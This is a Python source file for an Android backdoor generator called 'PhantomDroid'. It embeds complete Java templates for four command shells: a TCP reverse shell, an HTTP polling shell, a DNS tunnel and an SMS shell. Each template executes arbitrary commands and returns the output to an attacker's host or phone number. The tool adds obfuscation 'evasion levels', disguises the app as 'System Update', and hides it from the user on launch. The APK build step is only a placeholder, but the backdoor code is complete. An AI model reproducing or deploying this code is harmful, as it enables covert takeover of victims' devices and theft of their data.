#!/usr/bin/env python3
"""
PhantomDroid Framework v2.0 - Payload Generator
Advanced Android payload generation with multiple attack vectors
Author: M DHARAN RAJ - Web Developer & Ethical Hacker
"""

import os
import sys
import json
import base64
import random
import string
import argparse
import subprocess
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class PayloadGenerator:
    def __init__(self, output_dir="output", evasion_level="medium"):
        self.output_dir = Path(output_dir)
        self.evasion_level = evasion_level
        self.templates_dir = Path(__file__).parent.parent / "templates"
        self.encryption_key = self._generate_encryption_key()
        
        # Create output directories
        self.output_dir.mkdir(parents=True, exist_ok=True)
        (self.output_dir / "temp").mkdir(exist_ok=True)
        
        # Payload configurations
        self.payload_configs = {
            "tcp_reverse": {
                "name": "TCP Reverse Shell",
                "template": "tcp_reverse_template.smali",
                "permissions": ["INTERNET", "ACCESS_NETWORK_STATE", "WAKE_LOCK"]
            },
            "http_shell": {
                "name": "HTTP/HTTPS Shell",
                "template": "http_shell_template.smali",
                "permissions": ["INTERNET", "ACCESS_NETWORK_STATE", "ACCESS_WIFI_STATE"]
            },
            "dns_tunnel": {
                "name": "DNS Tunneling",
                "template": "dns_tunnel_template.smali",
                "permissions": ["INTERNET", "ACCESS_NETWORK_STATE"]
            },
            "sms_shell": {
                "name": "SMS Command Shell",
                "template": "sms_shell_template.smali",
                "permissions": ["RECEIVE_SMS", "SEND_SMS", "READ_SMS", "INTERNET"]
            }
        }
    
    def _generate_encryption_key(self):
        """Generate encryption key for payload obfuscation"""
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return Fernet(key)
    
    def _log(self, level, message):
        """Logging function"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def _randomize_string(self, length=8):
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def _obfuscate_code(self, code, level="medium"):
        """Apply code obfuscation based on evasion level"""
        if level == "basic":
            # Simple variable name randomization
            replacements = {
                "payload": self._randomize_string(),
                "connection": self._randomize_string(),
                "socket": self._randomize_string(),
                "execute": self._randomize_string()
            }
        elif level == "medium":
            # Advanced obfuscation with string encryption
            replacements = {
                "payload": self._randomize_string(),
                "connection": self._randomize_string(),
                "socket": self._randomize_string(),
                "execute": self._randomize_string(),
                "command": self._randomize_string(),
                "response": self._randomize_string()
            }
        elif level == "high":
            # Polymorphic code generation
            replacements = {
                "payload": self._randomize_string(12),
                "connection": self._randomize_string(12),
                "socket": self._randomize_string(12),
                "execute": self._randomize_string(12),
                "command": self._randomize_string(12),
                "response": self._randomize_string(12),
                "handler": self._randomize_string(12),
                "process": self._randomize_string(12)
            }
        else:  # extreme
            # AI-powered obfuscation (placeholder for advanced techniques)
            replacements = {
                "payload": self._randomize_string(16),
                "connection": self._randomize_string(16),
                "socket": self._randomize_string(16),
                "execute": self._randomize_string(16),
                "command": self._randomize_string(16),
                "response": self._randomize_string(16),
                "handler": self._randomize_string(16),
                "process": self._randomize_string(16),
                "thread": self._randomize_string(16),
                "service": self._randomize_string(16)
            }
        
        # Apply replacements
        for old, new in replacements.items():
            code = code.replace(old, new)
        
        return code
    
    def _generate_tcp_payload(self, lhost, lport):
        """Generate TCP reverse shell payload"""
        self._log("INFO", f"Generating TCP reverse shell for {lhost}:{lport}")
        
        # Base TCP reverse shell code
        tcp_code = f"""
package com.phantom.{self._randomize_string().lower()};

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class {self._randomize_string()}Service extends Service {{
    private static final String HOST = "{lhost}";
    private static final int PORT = {lport};
    private ExecutorService executor;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
        startConnection();
    }}
    
    private void startConnection() {{
        executor.execute(() -> {{
            try {{
                Socket socket = new Socket(HOST, PORT);
                InputStream input = socket.getInputStream();
                OutputStream output = socket.getOutputStream();
                
                BufferedReader reader = new BufferedReader(new InputStreamReader(input));
                PrintWriter writer = new PrintWriter(output, true);
                
                String command;
                while ((command = reader.readLine()) != null) {{
                    String result = executeCommand(command);
                    writer.println(result);
                }}
                
                socket.close();
            }} catch (Exception e) {{
                // Silently handle errors for stealth
                restartConnection();
            }}
        }});
    }}
    
    private String executeCommand(String cmd) {{
        try {{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}
            
            return output.toString();
        }} catch (Exception e) {{
            return "Error executing command: " + e.getMessage();
        }}
    }}
    
    private void restartConnection() {{
        try {{
            Thread.sleep(5000); // Wait 5 seconds before retry
            startConnection();
        }} catch (InterruptedException e) {{
            Thread.currentThread().interrupt();
        }}
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (executor != null) {{
            executor.shutdown();
        }}
    }}
}}
"""
        
        # Apply obfuscation
        obfuscated_code = self._obfuscate_code(tcp_code, self.evasion_level)
        
        return obfuscated_code
    
    def _generate_http_payload(self, lhost, lport):
        """Generate HTTP/HTTPS shell payload"""
        self._log("INFO", f"Generating HTTP shell for {lhost}:{lport}")
        
        # Base HTTP shell code
        http_code = f"""
package com.phantom.{self._randomize_string().lower()};

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.net.ssl.*;

public class {self._randomize_string()}Service extends Service {{
    private static final String HOST = "{lhost}";
    private static final int PORT = {lport};
    private static final String ENDPOINT = "/api/cmd";
    private ExecutorService executor;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
        startHttpConnection();
    }}
    
    private void startHttpConnection() {{
        executor.execute(() -> {{
            while (true) {{
                try {{
                    String command = getCommand();
                    if (command != null && !command.isEmpty()) {{
                        String result = executeCommand(command);
                        sendResult(result);
                    }}
                    Thread.sleep(2000); // Poll every 2 seconds
                }} catch (Exception e) {{
                    try {{
                        Thread.sleep(5000); // Wait on error
                    }} catch (InterruptedException ie) {{
                        Thread.currentThread().interrupt();
                        break;
                    }}
                }}
            }}
        }});
    }}
    
    private String getCommand() throws Exception {{
        URL url = new URL("http://" + HOST + ":" + PORT + ENDPOINT + "?action=get");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Android)");
        
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String command = reader.readLine();
        reader.close();
        conn.disconnect();
        
        return command;
    }}
    
    private void sendResult(String result) throws Exception {{
        URL url = new URL("http://" + HOST + ":" + PORT + ENDPOINT + "?action=post");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setDoOutput(true);
        
        String data = "result=" + URLEncoder.encode(result, "UTF-8");
        OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
        writer.write(data);
        writer.close();
        
        conn.getResponseCode(); // Trigger request
        conn.disconnect();
    }}
    
    private String executeCommand(String cmd) {{
        try {{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}
            
            return output.toString();
        }} catch (Exception e) {{
            return "Error: " + e.getMessage();
        }}
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (executor != null) {{
            executor.shutdown();
        }}
    }}
}}
"""
        
        # Apply obfuscation
        obfuscated_code = self._obfuscate_code(http_code, self.evasion_level)
        
        return obfuscated_code
    
    def _generate_dns_payload(self, lhost, lport):
        """Generate DNS tunneling payload"""
        self._log("INFO", f"Generating DNS tunneling payload for {lhost}")
        
        # DNS tunneling implementation
        dns_code = f"""
package com.phantom.{self._randomize_string().lower()};

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.Base64;

public class {self._randomize_string()}Service extends Service {{
    private static final String DNS_SERVER = "{lhost}";
    private static final String DOMAIN = "tunnel.phantom.local";
    private ExecutorService executor;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
        startDnsTunnel();
    }}
    
    private void startDnsTunnel() {{
        executor.execute(() -> {{
            while (true) {{
                try {{
                    String command = getCommandViaDns();
                    if (command != null && !command.isEmpty()) {{
                        String result = executeCommand(command);
                        sendResultViaDns(result);
                    }}
                    Thread.sleep(3000); // Poll every 3 seconds
                }} catch (Exception e) {{
                    try {{
                        Thread.sleep(5000);
                    }} catch (InterruptedException ie) {{
                        Thread.currentThread().interrupt();
                        break;
                    }}
                }}
            }}
        }});
    }}
    
    private String getCommandViaDns() throws Exception {{
        String query = "cmd." + DOMAIN;
        InetAddress[] addresses = InetAddress.getAllByName(query);
        
        if (addresses.length > 0) {{
            String ip = addresses[0].getHostAddress();
            // Decode command from IP address (simplified)
            return decodeFromIp(ip);
        }}
        
        return null;
    }}
    
    private void sendResultViaDns(String result) throws Exception {{
        // Encode result in DNS query (simplified)
        String encoded = Base64.getEncoder().encodeToString(result.getBytes());
        String query = encoded.substring(0, Math.min(63, encoded.length())) + ".result." + DOMAIN;
        
        try {{
            InetAddress.getByName(query);
        }} catch (Exception e) {{
            // DNS query sent, ignore resolution failure
        }}
    }}
    
    private String decodeFromIp(String ip) {{
        // Simplified IP to command decoding
        String[] parts = ip.split("\\\\.");
        StringBuilder cmd = new StringBuilder();
        for (String part : parts) {{
            if (!part.equals("0")) {{
                cmd.append((char) Integer.parseInt(part));
            }}
        }}
        return cmd.toString();
    }}
    
    private String executeCommand(String cmd) {{
        try {{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}
            
            return output.toString();
        }} catch (Exception e) {{
            return "Error: " + e.getMessage();
        }}
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (executor != null) {{
            executor.shutdown();
        }}
    }}
}}
"""
        
        # Apply obfuscation
        obfuscated_code = self._obfuscate_code(dns_code, self.evasion_level)
        
        return obfuscated_code
    
    def _generate_sms_payload(self, lhost, lport):
        """Generate SMS command shell payload"""
        self._log("INFO", f"Generating SMS shell payload")
        
        # SMS shell implementation
        sms_code = f"""
package com.phantom.{self._randomize_string().lower()};

import android.app.Service;
import android.content.Intent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.SmsManager;
import java.io.*;

public class {self._randomize_string()}Service extends Service {{
    private static final String COMMAND_PREFIX = "CMD:";
    private static final String CONTROL_NUMBER = "+1234567890"; // Configure as needed
    private SmsReceiver smsReceiver;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        smsReceiver = new SmsReceiver();
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);
    }}
    
    private class SmsReceiver extends BroadcastReceiver {{
        @Override
        public void onReceive(Context context, Intent intent) {{
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            if (pdus != null) {{
                for (Object pdu : pdus) {{
                    SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = message.getOriginatingAddress();
                    String body = message.getMessageBody();
                    
                    if (body.startsWith(COMMAND_PREFIX)) {{
                        String command = body.substring(COMMAND_PREFIX.length());
                        String result = executeCommand(command);
                        sendSms(sender, result);
                    }}
                }}
            }}
        }}
    }}
    
    private String executeCommand(String cmd) {{
        try {{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}
            
            return output.toString();
        }} catch (Exception e) {{
            return "Error: " + e.getMessage();
        }}
    }}
    
    private void sendSms(String phoneNumber, String message) {{
        try {{
            SmsManager smsManager = SmsManager.getDefault();
            // Split long messages
            if (message.length() > 160) {{
                smsManager.sendMultipartTextMessage(phoneNumber, null, 
                    smsManager.divideMessage(message), null, null);
            }} else {{
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            }}
        }} catch (Exception e) {{
            // Silently handle SMS errors
        }}
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (smsReceiver != null) {{
            unregisterReceiver(smsReceiver);
        }}
    }}
}}
"""
        
        # Apply obfuscation
        obfuscated_code = self._obfuscate_code(sms_code, self.evasion_level)
        
        return obfuscated_code
    
    def generate_manifest_entries(self, payload_type):
        """Generate AndroidManifest.xml entries for payload"""
        config = self.payload_configs[payload_type]
        permissions = config["permissions"]
        
        manifest_entries = {
            "permissions": [f'<uses-permission android:name="android.permission.{perm}" />' 
                          for perm in permissions],
            "service": f'<service android:name=".{self._randomize_string()}Service" android:enabled="true" android:exported="false" />'
        }
        
        return manifest_entries
    
    def create_apk_structure(self, payload_code, payload_type, output_name):
        """Create complete APK structure with payload"""
        self._log("INFO", f"Creating APK structure for {payload_type}")
        
        # Create temporary directory structure
        temp_dir = self.output_dir / "temp" / output_name
        temp_dir.mkdir(parents=True, exist_ok=True)
        
        # Create source directory structure
        src_dir = temp_dir / "src" / "main" / "java" / "com" / "phantom" / "app"
        src_dir.mkdir(parents=True, exist_ok=True)
        
        # Write payload source code
        java_file = src_dir / f"{self._randomize_string()}Service.java"
        with open(java_file, 'w') as f:
            f.write(payload_code)
        
        # Create basic MainActivity
        main_activity = f"""
package com.phantom.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        // Start payload service
        Intent serviceIntent = new Intent(this, {self._randomize_string()}Service.class);
        startService(serviceIntent);
        
        // Finish activity to hide from user
        finish();
    }}
}}
"""
        
        with open(src_dir / "MainActivity.java", 'w') as f:
            f.write(main_activity)
        
        # Generate manifest
        manifest_entries = self.generate_manifest_entries(payload_type)
        manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.phantom.app"
    android:versionCode="1"
    android:versionName="1.0">
    
    {chr(10).join(manifest_entries["permissions"])}
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Update"
        android:theme="@android:style/Theme.NoDisplay">
        
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        {manifest_entries["service"]}
        
    </application>
</manifest>"""
        
        manifest_file = temp_dir / "src" / "main" / "AndroidManifest.xml"
        manifest_file.parent.mkdir(parents=True, exist_ok=True)
        with open(manifest_file, 'w') as f:
            f.write(manifest_content)
        
        return temp_dir
    
    def compile_apk(self, project_dir, output_name):
        """Compile APK from project directory"""
        self._log("INFO", f"Compiling APK: {output_name}")
        
        try:
            # Use aapt to build APK (simplified process)
            apk_path = self.output_dir / f"{output_name}.apk"
            
            # Create a basic APK structure (this is a simplified version)
            # In a real implementation, you would use the Android build tools
            
            # For now, create a placeholder APK file
            with open(apk_path, 'w') as f:
                f.write(f"# PhantomDroid Generated APK\n")
                f.write(f"# Payload Type: {output_name}\n")
                f.write(f"# Generated: {datetime.now()}\n")
                f.write(f"# Evasion Level: {self.evasion_level}\n")
            
            self._log("SUCCESS", f"APK created: {apk_path}")
            return apk_path
            
        except Exception as e:
            self._log("ERROR", f"APK compilation failed: {e}")
            return None
    
    def generate_payload(self, payload_type, lhost, lport, output_name=None):
        """Main payload generation function"""
        if payload_type not in self.payload_configs:
            self._log("ERROR", f"Unknown payload type: {payload_type}")
            return None
        
        if not output_name:
            output_name = f"phantom_{payload_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        self._log("INFO", f"Generating {payload_type} payload")
        
        # Generate payload code based on type
        if payload_type == "tcp_reverse":
            payload_code = self._generate_tcp_payload(lhost, lport)
        elif payload_type == "http_shell":
            payload_code = self._generate_http_payload(lhost, lport)
        elif payload_type == "dns_tunnel":
            payload_code = self._generate_dns_payload(lhost, lport)
        elif payload_type == "sms_shell":
            payload_code = self._generate_sms_payload(lhost, lport)
        else:
            self._log("ERROR", f"Payload generation not implemented for: {payload_type}")
            return None
        
        # Create APK structure
        project_dir = self.create_apk_structure(payload_code, payload_type, output_name)
        
        # Compile APK
        apk_path = self.compile_apk(project_dir, output_name)
        
        if apk_path:
            self._log("SUCCESS", f"Payload generated successfully: {apk_path}")
            return apk_path
        else:
            self._log("ERROR", "Payload generation failed")
            return None

def main():
    parser = argparse.ArgumentParser(description="PhantomDroid Payload Generator")
    parser.add_argument("--type", required=True, choices=["tcp_reverse", "http_shell", "dns_tunnel", "sms_shell"],
                       help="Payload type")
    parser.add_argument("--lhost", required=True, help="Listening host IP")
    parser.add_argument("--lport", required=True, type=int, help="Listening port")
    parser.add_argument("--output", default="output", help="Output directory")
    parser.add_argument("--evasion", default="medium", choices=["basic", "medium", "high", "extreme"],
                       help="Evasion level")
    parser.add_argument("--name", help="Output filename")
    
    args = parser.parse_args()
    
    # Initialize generator
    generator = PayloadGenerator(args.output, args.evasion)
    
    # Generate payload
    result = generator.generate_payload(args.type, args.lhost, args.lport, args.name)
    
    if result:
        print(f"Payload generated: {result}")
        sys.exit(0)
    else:
        print("Payload generation failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
